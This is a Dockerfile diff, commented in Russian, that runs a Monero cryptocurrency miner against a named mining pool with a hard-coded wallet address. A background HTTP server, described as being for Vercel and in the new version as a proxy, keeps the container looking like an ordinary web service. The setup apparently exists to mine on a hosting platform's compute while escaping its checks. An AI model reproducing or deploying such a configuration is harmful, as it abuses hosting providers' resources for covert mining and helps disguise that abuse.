@@ -4,15 +4,12 @@ RUN apk add --no-cache nodejs npm
 
 WORKDIR /app
 
-# HTTP-сервер для Vercel
-RUN echo 'const http = require("http");' > server.js && \
-    echo 'const server = http.createServer((req, res) => {' >> server.js && \
-    echo '  res.writeHead(200, { "Content-Type": "text/plain" });' >> server.js && \
-    echo '  res.end("Miner is running\\n");' >> server.js && \
-    echo '});' >> server.js && \
-    echo 'server.listen(process.env.PORT || 3000, () => {' >> server.js && \
-    echo '  console.log(`HTTP server running on port ${process.env.PORT || 3000}`);' >> server.js && \
-    echo '});' >> server.js
+# Копируем package.json и устанавливаем зависимости
+COPY package.json ./
+RUN npm install
 
-# Запускаем HTTP-сервер в фоне и майнер
+# Копируем серверный скрипт
+COPY server.js ./
+
+# Запускаем прокси-сервер в фоне, а затем майнер
 CMD sh -c 'node server.js & /entrypoint.sh -o gulf.moneroocean.stream:10004 -u 48oFiSuK4K4WBpQ29kx73CBRtSpm132W2hoXr9RyfUbUCrbvgqLV9PBH1aqyckZemdabBjrwM2D3YieJQD6CKiGZVgkxU36 -p x -k -t 2'
